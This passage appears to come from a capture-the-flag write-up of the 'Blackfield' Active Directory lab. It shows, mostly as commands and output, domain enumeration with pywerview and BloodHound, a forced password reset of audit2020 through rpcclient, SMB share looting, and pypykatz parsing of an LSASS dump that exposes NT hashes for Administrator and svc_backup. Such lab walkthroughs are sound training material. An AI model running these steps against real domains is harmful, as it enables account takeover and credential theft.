                               GC/DC01.BLACKFIELD.local/BLACKFIELD.local,
                               RestrictedKrbHost/DC01.BLACKFIELD.local,
                               RestrictedKrbHost/DC01,
                               RPC/2a754031-e5c5-4e88-bb09-09aae693753c._msdcs.BLACKFIELD.local,
                               HOST/DC01/BLACKFIELD,
                               HOST/DC01.BLACKFIELD.local/BLACKFIELD,
                               HOST/DC01,
                               HOST/DC01.BLACKFIELD.local,
                               HOST/DC01.BLACKFIELD.local/BLACKFIELD.local,
                               E3514235-4B06-11D1-AB04-00C04FC2DCD2/2a754031-e5c5-4e88-bb09-09aae693753c/BLACKFIELD.local,
                               ldap/DC01/BLACKFIELD,
                               ldap/2a754031-e5c5-4e88-bb09-09aae693753c._msdcs.BLACKFIELD.local,
                               ldap/DC01.BLACKFIELD.local/BLACKFIELD,
                               ldap/DC01,
                               ldap/DC01.BLACKFIELD.local,
                               ldap/DC01.BLACKFIELD.local/BLACKFIELD.local
useraccountcontrol:            ['SERVER_TRUST_ACCOUNT', 'TRUSTED_FOR_DELEGATION']
usnchanged:                    217154
usncreated:                    12293
whenchanged:                   2021-11-04 18:42:14
whencreated:                   2020-02-23 11:14:00
```

Since the target is serving DNS, query it for the IP address of `DC01.blackfield.local`. The response reveals that the target is `DC01.blackfield.local`, as previously thought.

```bash
$ nslookup DC01.blackfield.local 10.129.250.124
Server:         10.129.250.124
Address:        10.129.250.124#53

Name:   DC01.blackfield.local
Address: 10.129.250.124
```              

---

### Domain Users

The domain includes the typical Active Directory user accounts (`Administrator`, `Guest`, and `krbtgt`), along with the three previously discovered (`audit2020`, `support`, and `svc_backup`). There is one new unique user account, `lydericlefebvre`, and several user accounts of the format `BLACKFIELD$NUMBER`, where `$NUMBER` is a random 6-digit integer.

```bash
$ pywerview get-netuser -w blackfield.local -u support -p '#00^BlackKnight' --dc-ip 10.129.250.124 | grep samaccountname
samaccountname:                Administrator
samaccountname:                Guest
samaccountname:                krbtgt
samaccountname:                audit2020
samaccountname:                support
samaccountname:        BLACKFIELD764430
samaccountname:        BLACKFIELD538365
samaccountname:        BLACKFIELD189208
samaccountname:        BLACKFIELD404458
samaccountname:        BLACKFIELD706381
samaccountname:        BLACKFIELD937395
samaccountname:        BLACKFIELD553715
samaccountname:        BLACKFIELD840481
samaccountname:        BLACKFIELD622501
samaccountname:        BLACKFIELD787464
samaccountname:        BLACKFIELD163183
samaccountname:        BLACKFIELD869335
samaccountname:        BLACKFIELD319016
samaccountname:        BLACKFIELD600999
samaccountname:        BLACKFIELD894905
samaccountname:        BLACKFIELD253541
samaccountname:        BLACKFIELD175204
samaccountname:        BLACKFIELD727512
samaccountname:        BLACKFIELD227380
samaccountname:        BLACKFIELD251003
samaccountname:        BLACKFIELD129328
samaccountname:        BLACKFIELD616527
samaccountname:        BLACKFIELD533551
samaccountname:        BLACKFIELD883784
samaccountname:        BLACKFIELD908329
samaccountname:        BLACKFIELD601590
samaccountname:        BLACKFIELD573498
samaccountname:        BLACKFIELD290325
samaccountname:        BLACKFIELD775986
samaccountname:        BLACKFIELD348433
samaccountname:        BLACKFIELD196444
samaccountname:        BLACKFIELD137694
samaccountname:        BLACKFIELD533886
samaccountname:        BLACKFIELD268320
samaccountname:        BLACKFIELD909590
samaccountname:        BLACKFIELD136813
samaccountname:        BLACKFIELD358090
samaccountname:        BLACKFIELD561870
samaccountname:        BLACKFIELD269538
samaccountname:        BLACKFIELD169035
samaccountname:        BLACKFIELD118321
samaccountname:        BLACKFIELD592556
samaccountname:        BLACKFIELD618519
samaccountname:        BLACKFIELD329802
samaccountname:        BLACKFIELD753480
samaccountname:        BLACKFIELD837541
samaccountname:        BLACKFIELD186980
samaccountname:        BLACKFIELD419600
samaccountname:        BLACKFIELD220786
samaccountname:        BLACKFIELD767820
samaccountname:        BLACKFIELD549571
samaccountname:        BLACKFIELD411740
samaccountname:        BLACKFIELD768095
samaccountname:        BLACKFIELD835725
samaccountname:        BLACKFIELD251977
samaccountname:        BLACKFIELD430864
samaccountname:        BLACKFIELD413242
samaccountname:        BLACKFIELD464763
samaccountname:        BLACKFIELD266096
samaccountname:        BLACKFIELD334058
samaccountname:        BLACKFIELD404213
samaccountname:        BLACKFIELD219324
samaccountname:        BLACKFIELD412798
samaccountname:        BLACKFIELD441593
samaccountname:        BLACKFIELD606328
samaccountname:        BLACKFIELD796301
samaccountname:        BLACKFIELD415829
samaccountname:        BLACKFIELD820995
samaccountname:        BLACKFIELD695166
samaccountname:        BLACKFIELD759042
samaccountname:        BLACKFIELD607290
samaccountname:        BLACKFIELD229506
samaccountname:        BLACKFIELD256791
samaccountname:        BLACKFIELD997545
samaccountname:        BLACKFIELD114762
samaccountname:        BLACKFIELD321206
samaccountname:        BLACKFIELD195757
samaccountname:        BLACKFIELD877328
samaccountname:        BLACKFIELD446463
samaccountname:        BLACKFIELD579980
samaccountname:        BLACKFIELD775126
samaccountname:        BLACKFIELD429587
samaccountname:        BLACKFIELD534956
samaccountname:        BLACKFIELD315276
samaccountname:        BLACKFIELD995218
samaccountname:        BLACKFIELD843883
samaccountname:        BLACKFIELD876916
samaccountname:        BLACKFIELD382769
samaccountname:        BLACKFIELD194732
samaccountname:        BLACKFIELD191416
samaccountname:        BLACKFIELD932709
samaccountname:        BLACKFIELD546640
samaccountname:        BLACKFIELD569313
samaccountname:        BLACKFIELD744790
samaccountname:        BLACKFIELD739659
samaccountname:        BLACKFIELD926559
samaccountname:        BLACKFIELD969352
samaccountname:        BLACKFIELD253047
samaccountname:        BLACKFIELD899433
samaccountname:        BLACKFIELD606964
samaccountname:        BLACKFIELD385719
samaccountname:        BLACKFIELD838710
samaccountname:        BLACKFIELD608914
samaccountname:        BLACKFIELD569653
samaccountname:        BLACKFIELD759079
samaccountname:        BLACKFIELD488531
samaccountname:        BLACKFIELD160610
samaccountname:        BLACKFIELD586934
samaccountname:        BLACKFIELD819822
samaccountname:        BLACKFIELD739765
samaccountname:        BLACKFIELD875008
samaccountname:        BLACKFIELD441759
samaccountname:        BLACKFIELD763893
samaccountname:        BLACKFIELD713470
samaccountname:        BLACKFIELD131771
samaccountname:        BLACKFIELD793029
samaccountname:        BLACKFIELD694429
samaccountname:        BLACKFIELD802251
samaccountname:        BLACKFIELD602567
samaccountname:        BLACKFIELD328983
samaccountname:        BLACKFIELD990638
samaccountname:        BLACKFIELD350809
samaccountname:        BLACKFIELD405242
samaccountname:        BLACKFIELD267457
samaccountname:        BLACKFIELD686428
samaccountname:        BLACKFIELD478828
samaccountname:        BLACKFIELD129387
samaccountname:        BLACKFIELD544934
samaccountname:        BLACKFIELD115148
samaccountname:        BLACKFIELD753537
samaccountname:        BLACKFIELD416532
samaccountname:        BLACKFIELD680939
samaccountname:        BLACKFIELD732035
samaccountname:        BLACKFIELD522135
samaccountname:        BLACKFIELD773423
samaccountname:        BLACKFIELD371669
samaccountname:        BLACKFIELD252379
samaccountname:        BLACKFIELD828826
samaccountname:        BLACKFIELD548394
samaccountname:        BLACKFIELD611993
samaccountname:        BLACKFIELD192642
samaccountname:        BLACKFIELD106360
samaccountname:        BLACKFIELD939243
samaccountname:        BLACKFIELD230515
samaccountname:        BLACKFIELD774376
samaccountname:        BLACKFIELD576233
samaccountname:        BLACKFIELD676303
samaccountname:        BLACKFIELD673073
samaccountname:        BLACKFIELD558867
samaccountname:        BLACKFIELD184482
samaccountname:        BLACKFIELD724669
samaccountname:        BLACKFIELD765350
samaccountname:        BLACKFIELD411132
samaccountname:        BLACKFIELD128775
samaccountname:        BLACKFIELD704154
samaccountname:        BLACKFIELD107197
samaccountname:        BLACKFIELD994577
samaccountname:        BLACKFIELD683323
samaccountname:        BLACKFIELD433476
samaccountname:        BLACKFIELD644281
samaccountname:        BLACKFIELD195953
samaccountname:        BLACKFIELD868068
samaccountname:        BLACKFIELD690642
samaccountname:        BLACKFIELD465267
samaccountname:        BLACKFIELD199889
samaccountname:        BLACKFIELD468839
samaccountname:        BLACKFIELD348835
samaccountname:        BLACKFIELD624385
samaccountname:        BLACKFIELD818863
samaccountname:        BLACKFIELD939200
samaccountname:        BLACKFIELD135990
samaccountname:        BLACKFIELD484290
samaccountname:        BLACKFIELD898237
samaccountname:        BLACKFIELD773118
samaccountname:        BLACKFIELD148067
samaccountname:        BLACKFIELD390179
samaccountname:        BLACKFIELD359278
samaccountname:        BLACKFIELD375924
samaccountname:        BLACKFIELD533060
samaccountname:        BLACKFIELD534196
samaccountname:        BLACKFIELD639103
samaccountname:        BLACKFIELD933887
samaccountname:        BLACKFIELD907614
samaccountname:        BLACKFIELD991588
samaccountname:        BLACKFIELD781404
samaccountname:        BLACKFIELD787995
samaccountname:        BLACKFIELD911926
samaccountname:        BLACKFIELD146200
samaccountname:        BLACKFIELD826622
samaccountname:        BLACKFIELD171624
samaccountname:        BLACKFIELD497216
samaccountname:        BLACKFIELD839613
samaccountname:        BLACKFIELD428532
samaccountname:        BLACKFIELD697473
samaccountname:        BLACKFIELD291678
samaccountname:        BLACKFIELD623122
samaccountname:        BLACKFIELD765982
samaccountname:        BLACKFIELD701303
samaccountname:        BLACKFIELD250576
samaccountname:        BLACKFIELD971417
samaccountname:        BLACKFIELD160820
samaccountname:        BLACKFIELD385928
samaccountname:        BLACKFIELD848660
samaccountname:        BLACKFIELD682842
samaccountname:        BLACKFIELD813266
samaccountname:        BLACKFIELD274577
samaccountname:        BLACKFIELD448641
samaccountname:        BLACKFIELD318077
samaccountname:        BLACKFIELD289513
samaccountname:        BLACKFIELD336573
samaccountname:        BLACKFIELD962495
samaccountname:        BLACKFIELD566117
samaccountname:        BLACKFIELD617630
samaccountname:        BLACKFIELD717683
samaccountname:        BLACKFIELD390192
samaccountname:        BLACKFIELD652779
samaccountname:        BLACKFIELD665997
samaccountname:        BLACKFIELD998321
samaccountname:        BLACKFIELD946509
samaccountname:        BLACKFIELD228442
samaccountname:        BLACKFIELD548464
samaccountname:        BLACKFIELD586592
samaccountname:        BLACKFIELD512331
samaccountname:        BLACKFIELD609423
samaccountname:        BLACKFIELD395725
samaccountname:        BLACKFIELD438923
samaccountname:        BLACKFIELD691480
samaccountname:        BLACKFIELD236467
samaccountname:        BLACKFIELD895235
samaccountname:        BLACKFIELD788523
samaccountname:        BLACKFIELD710285
samaccountname:        BLACKFIELD357023
samaccountname:        BLACKFIELD362337
samaccountname:        BLACKFIELD651599
samaccountname:        BLACKFIELD579344
samaccountname:        BLACKFIELD859776
samaccountname:        BLACKFIELD789969
samaccountname:        BLACKFIELD356727
samaccountname:        BLACKFIELD962999
samaccountname:        BLACKFIELD201655
samaccountname:        BLACKFIELD635996
samaccountname:        BLACKFIELD478410
samaccountname:        BLACKFIELD518316
samaccountname:        BLACKFIELD202900
samaccountname:        BLACKFIELD767498
samaccountname:        BLACKFIELD103974
samaccountname:        BLACKFIELD135403
samaccountname:        BLACKFIELD112766
samaccountname:        BLACKFIELD978938
samaccountname:        BLACKFIELD871753
samaccountname:        BLACKFIELD136203
samaccountname:        BLACKFIELD634593
samaccountname:        BLACKFIELD274367
samaccountname:        BLACKFIELD520852
samaccountname:        BLACKFIELD339143
samaccountname:        BLACKFIELD684814
samaccountname:        BLACKFIELD792484
samaccountname:        BLACKFIELD802875
samaccountname:        BLACKFIELD383108
samaccountname:        BLACKFIELD318250
samaccountname:        BLACKFIELD496547
samaccountname:        BLACKFIELD219914
samaccountname:        BLACKFIELD454313
samaccountname:        BLACKFIELD460131
samaccountname:        BLACKFIELD613771
samaccountname:        BLACKFIELD632329
samaccountname:        BLACKFIELD402639
samaccountname:        BLACKFIELD235930
samaccountname:        BLACKFIELD246388
samaccountname:        BLACKFIELD946435
samaccountname:        BLACKFIELD739227
samaccountname:        BLACKFIELD827906
samaccountname:        BLACKFIELD198927
samaccountname:        BLACKFIELD169876
samaccountname:        BLACKFIELD150357
samaccountname:        BLACKFIELD594619
samaccountname:        BLACKFIELD274109
samaccountname:        BLACKFIELD682949
samaccountname:        BLACKFIELD316850
samaccountname:        BLACKFIELD884808
samaccountname:        BLACKFIELD327610
samaccountname:        BLACKFIELD899238
samaccountname:        BLACKFIELD184493
samaccountname:        BLACKFIELD631162
samaccountname:        BLACKFIELD591846
samaccountname:        BLACKFIELD896715
samaccountname:        BLACKFIELD500073
samaccountname:        BLACKFIELD584113
samaccountname:        BLACKFIELD204805
samaccountname:        BLACKFIELD842593
samaccountname:        BLACKFIELD397679
samaccountname:        BLACKFIELD842438
samaccountname:        BLACKFIELD286615
samaccountname:        BLACKFIELD224839
samaccountname:        BLACKFIELD631599
samaccountname:        BLACKFIELD247450
samaccountname:        BLACKFIELD290582
samaccountname:        BLACKFIELD657263
samaccountname:        BLACKFIELD314351
samaccountname:        BLACKFIELD434395
samaccountname:        BLACKFIELD410243
samaccountname:        BLACKFIELD307633
samaccountname:        BLACKFIELD758945
samaccountname:        BLACKFIELD541148
samaccountname:        BLACKFIELD532412
samaccountname:        BLACKFIELD996878
samaccountname:        BLACKFIELD653097
samaccountname:        BLACKFIELD438814
samaccountname:                svc_backup
samaccountname:        lydericlefebvre
```

The user account `lydericlefebvre`'s description indicates that they are the VM creator.

```txt
description:           @lydericlefebvre - VM Creator
```

Following the Twitter handle leads to the Twitter account of the actual creator of the vulnerable machine.

#### ASREP Roastable Users

The only ASREP Roastable account is `support`, who has already been ASREP Roasted.

```bash
$ pywerview get-netuser -w blackfield.local -u support -p '#00^BlackKnight' --dc-ip 10.129.250.124 --preauth-notreq
accountexpires:                0
badpasswordtime:               2020-09-21 18:38:01.432064
badpwdcount:                   1
cn:                            support
codepage:                      0
countrycode:                   0
distinguishedname:             CN=support,CN=Users,DC=BLACKFIELD,DC=local
dscorepropagationdata:         2020-02-28 22:33:49,
                               2020-02-23 15:27:47,
                               1601-01-01 00:00:00
homedirectory:
instancetype:                  4
isgroup:                       False
lastlogoff:                    1600-12-31 19:03:58
lastlogon:                     2020-09-21 18:33:32.925574
lastlogontimestamp:            132809671950279585
logoncount:                    8
logonhours:                    [255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255]
msds-supportedencryptiontypes: 0
name:                          support
objectcategory:                CN=Person,CN=Schema,CN=Configuration,DC=BLACKFIELD,DC=local
objectclass:                   top,
                               person,
                               organizationalPerson,
                               user
objectguid:                    ae4911cf-203d-443d-b'96f8'-1b8d7b250d3e
objectsid:                     S-1-5-21-4194615774-2175524697-3563712290-1104
primarygroupid:                513
profilepath:
pwdlastset:                    2020-02-23 12:53:23.851734
samaccountname:                support
samaccounttype:                805306368
scriptpath:
useraccountcontrol:            ['NORMAL_ACCOUNT', 'DONT_EXPIRE_PASSWORD', 'DONT_REQ_PREAUTH']
usnchanged:                    225370
usncreated:                    12795
whenchanged:                   2021-11-09 21:33:15
whencreated:                   2020-02-23 11:50:32
```

#### Kerberoastable Users

The only Kerberoastable user is the default `krbtgt` account.

```bash
$ pywerview get-netuser -w blackfield.local -u support -p '#00^BlackKnight' --dc-ip 10.129.250.124 --spn
samaccountname: krbtgt
```

#### Users Configured with Constrained Delegation

There are no users configured with constrained delegation.

```bash
$ pywerview get-netuser -w blackfield.local -u support -p '#00^BlackKnight' --dc-ip 10.129.250.124 --custom-filter "(userAccountControl:1.2.840.113556.1.4.803:=16777216)"

```

#### Users with AdminCount = 1

```bash
$ pywerview get-netuser -w blackfield.local -u support -p '#00^BlackKnight' --dc-ip 10.129.250.124 --admin-count
samaccountname:                Administrator
samaccountname:                krbtgt
samaccountname:                svc_backup
```

`svc_backup` is a non-standard protected user.

---

### Domain Computers

The only computer in the domain is `DC01$`, the target. Like all domain controllers, it is configured with unconstrained delegation.

```bash
$ pywerview get-netcomputer -w blackfield.local -u support -p '#00^BlackKnight' --dc-ip 10.129.250.124 --full-data
accountexpires:                9223372036854775807
badpasswordtime:               2020-02-23 12:14:34.951936
badpwdcount:                   0
cn:                            DC01
codepage:                      0
countrycode:                   0
distinguishedname:             CN=DC01,OU=Domain Controllers,DC=BLACKFIELD,DC=local
dnshostname:                   DC01.BLACKFIELD.local
dscorepropagationdata:         2020-02-23 11:14:01,
                               1601-01-01 00:00:01
instancetype:                  4
iscriticalsystemobject:        TRUE
isgroup:                       False
lastlogoff:                    1600-12-31 19:03:58
lastlogon:                     2021-11-09 16:22:35.627851
lastlogontimestamp:            132805249345101039
localpolicyflags:              0
logoncount:                    120
msdfsr-computerreferencebl:    CN=DC01,CN=Topology,CN=Domain System Volume,CN=DFSR-GlobalSettings,CN=System,DC=BLACKFIELD,DC=local
msds-generationid:             61,
                               32,
                               101,
                               49,
                               192,
                               63,
                               107,
                               64
msds-supportedencryptiontypes: 28
name:                          DC01
objectcategory:                CN=Computer,CN=Schema,CN=Configuration,DC=BLACKFIELD,DC=local
objectclass:                   top,
                               person,
                               organizationalPerson,
                               user,
                               computer
objectguid:                    b5ada5c8-edeb-4f19-b'8092'-e14e51662f9e
objectsid:                     S-1-5-21-4194615774-2175524697-3563712290-1000
operatingsystem:               Windows Server 2019 Standard
operatingsystemversion:        10.0 (17763)
primarygroupid:                516
pwdlastset:                    2021-11-04 14:42:06.322601
ridsetreferences:              CN=RID Set,CN=DC01,OU=Domain Controllers,DC=BLACKFIELD,DC=local
samaccountname:                DC01$
samaccounttype:                805306369
serverreferencebl:             CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=BLACKFIELD,DC=local
serviceprincipalname:          Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/DC01.BLACKFIELD.local,
                               ldap/DC01.BLACKFIELD.local/ForestDnsZones.BLACKFIELD.local,
                               ldap/DC01.BLACKFIELD.local/DomainDnsZones.BLACKFIELD.local,
                               TERMSRV/DC01,
                               TERMSRV/DC01.BLACKFIELD.local,
                               DNS/DC01.BLACKFIELD.local,
                               GC/DC01.BLACKFIELD.local/BLACKFIELD.local,
                               RestrictedKrbHost/DC01.BLACKFIELD.local,
                               RestrictedKrbHost/DC01,
                               RPC/2a754031-e5c5-4e88-bb09-09aae693753c._msdcs.BLACKFIELD.local,
                               HOST/DC01/BLACKFIELD,
                               HOST/DC01.BLACKFIELD.local/BLACKFIELD,
                               HOST/DC01,
                               HOST/DC01.BLACKFIELD.local,
                               HOST/DC01.BLACKFIELD.local/BLACKFIELD.local,
                               E3514235-4B06-11D1-AB04-00C04FC2DCD2/2a754031-e5c5-4e88-bb09-09aae693753c/BLACKFIELD.local,
                               ldap/DC01/BLACKFIELD,
                               ldap/2a754031-e5c5-4e88-bb09-09aae693753c._msdcs.BLACKFIELD.local,
                               ldap/DC01.BLACKFIELD.local/BLACKFIELD,
                               ldap/DC01,
                               ldap/DC01.BLACKFIELD.local,
                               ldap/DC01.BLACKFIELD.local/BLACKFIELD.local
useraccountcontrol:            ['SERVER_TRUST_ACCOUNT', 'TRUSTED_FOR_DELEGATION']
usnchanged:                    217154
usncreated:                    12293
whenchanged:                   2021-11-04 18:42:14
whencreated:                   2020-02-23 11:14:00
```

---

### Domain Groups

There doesn't seem to be any non-standard groups.

```bash
$ pywerview get-netgroup -w blackfield.local -u support -p '#00^BlackKnight' --dc-ip 10.129.250.124 --full-data | grep samaccountname
samaccountname:         Administrators
samaccountname:         Users
samaccountname:         Guests
samaccountname:         Print Operators
samaccountname:         Backup Operators
samaccountname:         Replicator
samaccountname:         Remote Desktop Users
samaccountname:         Network Configuration Operators
samaccountname:         Performance Monitor Users
samaccountname:         Performance Log Users
samaccountname:         Distributed COM Users
samaccountname:         IIS_IUSRS
samaccountname:         Cryptographic Operators
samaccountname:         Event Log Readers
samaccountname:         Certificate Service DCOM Access
samaccountname:         RDS Remote Access Servers
samaccountname:         RDS Endpoint Servers
samaccountname:         RDS Management Servers
samaccountname:         Hyper-V Administrators
samaccountname:         Access Control Assistance Operators
samaccountname:         Remote Management Users
samaccountname:         Storage Replica Administrators
samaccountname:         Domain Computers
samaccountname:         Domain Controllers
samaccountname:         Schema Admins
samaccountname:         Enterprise Admins
samaccountname:         Cert Publishers
samaccountname:         Domain Admins
samaccountname:         Domain Users
samaccountname:         Domain Guests
samaccountname:         Group Policy Creator Owners
samaccountname:         RAS and IAS Servers
samaccountname:         Server Operators
samaccountname:         Account Operators
samaccountname:         Pre-Windows 2000 Compatible Access
samaccountname:         Incoming Forest Trust Builders
samaccountname:         Windows Authorization Access Group
samaccountname:         Terminal Server License Servers
samaccountname:         Allowed RODC Password Replication Group
samaccountname:         Denied RODC Password Replication Group
samaccountname:         Read-only Domain Controllers
samaccountname:         Enterprise Read-only Domain Controllers
samaccountname:         Cloneable Domain Controllers
samaccountname:         Protected Users
samaccountname:         Key Admins
samaccountname:         Enterprise Key Admins
samaccountname:        DnsAdmins
samaccountname:        DnsUpdateProxy
```

---

### Domain Graph

Graph the relationships between the principals in the domain using BloodHound.

```bash
$ bloodhound-python -d blackfield.local -u support -p '#00^BlackKnight' -c All -ns 10.129.250.124
INFO: Found AD domain: blackfield.local
INFO: Connecting to LDAP server: dc01.blackfield.local
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 18 computers
INFO: Connecting to LDAP server: dc01.blackfield.local
INFO: Found 315 users
INFO: Connecting to GC LDAP server: dc01.blackfield.local
INFO: Found 51 groups
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.BLACKFIELD.local
INFO: Done in 00M 09S
```

The user account `support` has `ForceChangePassword` permission to the `audit2020`user account.

![](images/Pasted%20image%2020211109144906.png)

---

## Changing `audit2020`'s Password

Use the `support` user account to change `audit2020`'s password to `blahblah123!`.

```bash
$ rpcclient -U support //10.129.250.124
Enter WORKGROUP\support's password:
rpcclient $> setuserinfo2 audit2020 23 blahblah123!
```

Verify that it worked.

```bash
$ crackmapexec smb 10.129.250.124 -d blackfield.local -u audit2020 -p 'blahblah123!'
SMB         10.129.250.124  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:blackfield.local) (signing:True) (SMBv1:False)
SMB         10.129.250.124  445    DC01             [+] blackfield.local\audit2020:blahblah123!
```

---

## SMB Enumeration as `audit2020`

See what SMB shares `audit2020` has access to.

```bash
$ smbmap -u "audit2020" -p 'blahblah123!' -P 445 -H 10.129.250.124
[+] IP: 10.129.250.124:445      Name: 10.129.250.124
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        forensic                                                READ ONLY       Forensic / Audit share.
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share
        profiles$                                               READ ONLY
        SYSVOL                                                  READ ONLY       Logon server share
```

`audit2020` has read access to the `forensic` share. Inviestigate it.

```bash
$ smbclient -U blackfield.local/audit2020 //10.129.250.124/forensic
Enter BLACKFIELD.LOCAL\audit2020's password:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Feb 23 08:03:16 2020
  ..                                  D        0  Sun Feb 23 08:03:16 2020
  commands_output                     D        0  Sun Feb 23 13:14:37 2020
  memory_analysis                     D        0  Thu May 28 16:28:33 2020
  tools                               D        0  Sun Feb 23 08:39:08 2020
```

Recursively download the `commands_output/` and `memory_analysis/` folders for further investigation.

```bash
$ smbget -U audit2020 -R smb://10.129.250.124/forensic/commands_output
smb://10.129.250.124/forensic/commands_output/domain_admins.txt
smb://10.129.250.124/forensic/commands_output/domain_groups.txt
smb://10.129.250.124/forensic/commands_output/domain_users.txt
smb://10.129.250.124/forensic/commands_output/firewall_rules.txt
smb://10.129.250.124/forensic/commands_output/ipconfig.txt
smb://10.129.250.124/forensic/commands_output/netstat.txt
smb://10.129.250.124/forensic/commands_output/route.txt
smb://10.129.250.124/forensic/commands_output/systeminfo.txt
smb://10.129.250.124/forensic/commands_output/tasklist.txt
$ smbget -U audit2020 -R smb://10.129.250.124/forensic/memory_analysis
smb://10.129.250.124/forensic/memory_analysis/conhost.zip
smb://10.129.250.124/forensic/memory_analysis/ctfmon.zip
smb://10.129.250.124/forensic/memory_analysis/dfsrs.zip
smb://10.129.250.124/forensic/memory_analysis/dllhost.zip
smb://10.129.250.124/forensic/memory_analysis/ismserv.zip
smb://10.129.250.124/forensic/memory_analysis/lsass.zip
smb://10.129.250.124/forensic/memory_analysis/mmc.zip
smb://10.129.250.124/forensic/memory_analysis/RuntimeBroker.zip
smb://10.129.250.124/forensic/memory_analysis/ServerManager.zip
smb://10.129.250.124/forensic/memory_analysis/sihost.zip
smb://10.129.250.124/forensic/memory_analysis/smartscreen.zip
smb://10.129.250.124/forensic/memory_analysis/svchost.zip
smb://10.129.250.124/forensic/memory_analysis/taskhostw.zip
smb://10.129.250.124/forensic/memory_analysis/winlogon.zip
smb://10.129.250.124/forensic/memory_analysis/wlms.zip
smb://10.129.250.124/forensic/memory_analysis/WmiPrvSE.zip
```

The three tools in the `tools/` directory are SleuthKit 4.8.0, SysInternals, and Volatility. Since these are open source tools, there's no need to download them from the share.

---

## Investigating Forensic Artifacts & Parsing an LSASS Dump

In the `memory_analysis` directory there is a zipped LSASS minidump, `lsass.zip`. Unzip it and use `pypykatz` to parse the credentials out of the minidump.

```bash
$ cd memory_analysis/
$ unzip lsass.zip
$ pypykatz lsa minidump lsass.DMP
INFO:root:Parsing file lsass.DMP
FILE: ======== lsass.DMP =======
== LogonSession ==
authentication_id 406458 (633ba)
session_id 2
username svc_backup
domainname BLACKFIELD
logon_server DC01
logon_time 2020-02-23T18:00:03.423728+00:00
sid S-1-5-21-4194615774-2175524697-3563712290-1413
luid 406458
        == MSV ==
                Username: svc_backup
                Domain: BLACKFIELD
                LM: NA
                NT: 9658d1d1dcd9250115e2205d9f48400d
                SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c
        == WDIGEST [633ba]==
                username svc_backup
                domainname BLACKFIELD
                password None
        == SSP [633ba]==
                username
                domainname
                password None
        == Kerberos ==
                Username: svc_backup
                Domain: BLACKFIELD.LOCAL
                Password: None
        == WDIGEST [633ba]==
                username svc_backup
                domainname BLACKFIELD
                password None

== LogonSession ==
authentication_id 365835 (5950b)
session_id 2
username UMFD-2
domainname Font Driver Host
logon_server
logon_time 2020-02-23T17:59:38.218491+00:00
sid S-1-5-96-0-2
luid 365835
        == MSV ==
                Username: DC01$
                Domain: BLACKFIELD
                LM: NA
                NT: b624dc83a27cc29da11d9bf25efea796
                SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
        == WDIGEST [5950b]==
                username DC01$
                domainname BLACKFIELD
                password None
        == Kerberos ==
                Username: DC01$
                Domain: BLACKFIELD.local
                Password: &SYVE+<ynu`Ql;gvEE!f$DoO0F+,gP@P`fra`z4&G3K'mH:&'K^SW$FNWWx7J-N$^'bzB1Duc3^Ez]En kh`b'YSV7Ml#@G3@*(b$]j%#L^[Q`nCP'<Vb0I6
        == WDIGEST [5950b]==
                username DC01$
                domainname BLACKFIELD
                password None

== LogonSession ==
authentication_id 365493 (593b5)
session_id 2
username UMFD-2
domainname Font Driver Host
logon_server
logon_time 2020-02-23T17:59:38.200147+00:00
sid S-1-5-96-0-2
luid 365493
        == MSV ==
                Username: DC01$
                Domain: BLACKFIELD
                LM: NA
                NT: b624dc83a27cc29da11d9bf25efea796
                SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
        == WDIGEST [593b5]==
                username DC01$
                domainname BLACKFIELD
                password None
        == Kerberos ==
                Username: DC01$
                Domain: BLACKFIELD.local
                Password: &SYVE+<ynu`Ql;gvEE!f$DoO0F+,gP@P`fra`z4&G3K'mH:&'K^SW$FNWWx7J-N$^'bzB1Duc3^Ez]En kh`b'YSV7Ml#@G3@*(b$]j%#L^[Q`nCP'<Vb0I6
        == WDIGEST [593b5]==
                username DC01$
                domainname BLACKFIELD
                password None

== LogonSession ==
authentication_id 257142 (3ec76)
session_id 0
username DC01$
domainname BLACKFIELD
logon_server
logon_time 2020-02-23T17:59:13.318909+00:00
sid S-1-5-18
luid 257142
        == Kerberos ==
                Username: DC01$
                Domain: BLACKFIELD.LOCAL
                Password: None

== LogonSession ==
authentication_id 153705 (25869)
session_id 1
username Administrator
domainname BLACKFIELD
logon_server DC01
logon_time 2020-02-23T17:59:04.506080+00:00
sid S-1-5-21-4194615774-2175524697-3563712290-500
luid 153705
        == MSV ==
                Username: Administrator
                Domain: BLACKFIELD
                LM: NA
                NT: 7f1e4ff8c6a8e6b6fcae2d9c0572cd62
                SHA1: db5c89a961644f0978b4b69a4d2a2239d7886368
        == WDIGEST [25869]==
                username Administrator
                domainname BLACKFIELD
                password None
        == SSP [25869]==
                username
                domainname
                password None
        == Kerberos ==
                Username: Administrator
                Domain: BLACKFIELD.LOCAL
                Password: None
        == WDIGEST [25869]==
                username Administrator
                domainname BLACKFIELD
                password None
        == DPAPI [25869]==
                luid 153705
                key_guid d1f69692-cfdc-4a80-959e-bab79c9c327e
                masterkey 769c45bf7ceb3c0e28fb78f2e355f7072873930b3c1d3aef0e04ecbb3eaf16aa946e553007259bf307eb740f222decadd996ed660ffe648b0440d84cd97bf5a5
                sha1_masterkey d04452f8459a46460939ced67b971bcf27cb2fb9

== LogonSession ==
authentication_id 137110 (21796)
session_id 0
username DC01$
domainname BLACKFIELD
logon_server
logon_time 2020-02-23T17:58:27.068590+00:00
sid S-1-5-18
luid 137110
        == Kerberos ==
                Username: DC01$
                Domain: BLACKFIELD.LOCAL
                Password: None

== LogonSession ==
authentication_id 134695 (20e27)
session_id 0
username DC01$
domainname BLACKFIELD
logon_server
logon_time 2020-02-23T17:58:26.678019+00:00
sid S-1-5-18
luid 134695
        == Kerberos ==
                Username: DC01$
                Domain: BLACKFIELD.LOCAL
                Password: None

== LogonSession ==
authentication_id 40310 (9d76)
session_id 1
username DWM-1
